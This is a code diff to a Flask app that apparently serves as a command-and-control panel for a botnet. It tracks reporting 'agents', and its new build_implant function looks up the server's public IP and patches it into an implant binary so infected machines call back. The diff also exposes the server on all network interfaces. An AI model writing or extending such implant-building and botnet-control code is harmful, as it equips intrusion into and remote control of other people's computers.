@@ -1,9 +1,12 @@
 from flask import Flask, render_template, redirect, url_for, request, session, flash, abort, send_from_directory
 from flask_sqlalchemy import SQLAlchemy
 from functools import wraps
+
+import requests
 from config import BaseConfig
 import time
 import os
+import json
 
 from models import *
 
@@ -26,8 +29,23 @@ def login_required(f):
     return wrap
 
 
+def build_implant():
+    config = {}
+    config['ip'] = requests.get("https://api.ipify.org").text
+    config = json.dumps(config).encode("utf-8")
+    print(config)
+
+    with open('implant/payloads/implant', 'rb') as binFile:
+        byteData = bytearray(binFile.read())
+    offset = byteData.find(b'{"ip"')
+
+    with open('implant/payloads/implant', 'r+b') as binFile:
+        binFile.seek(offset)
+        binFile.write(config)
+
+
 def add_agent(agent_dict):
-    if not db.session.query(db.exists().where(Agent.ip == agent_dict['IP'])).scalar():
+   # if not db.session.query(db.exists().where(Agent.ip == agent_dict['IP'])).scalar():
         args = [str(agent_dict['Stats'][key]) for key in agent_dict['Stats']]
         args += [str(agent_dict['total'])]
         args += [agent_dict['IP']]
@@ -57,7 +75,7 @@ def bot(id):
     return render_template("bot.html", agent=agent)
 
 
-@app.route('/', methods=['GET'])
+@app.route('/', methods=['GET', 'POST'])
 @login_required
 def home():  # put application's code here
     output = ""
@@ -154,4 +172,4 @@ def logout():
 
 
 if __name__ == '__main__':
-    app.run()
+    app.run(host="0.0.0.0")
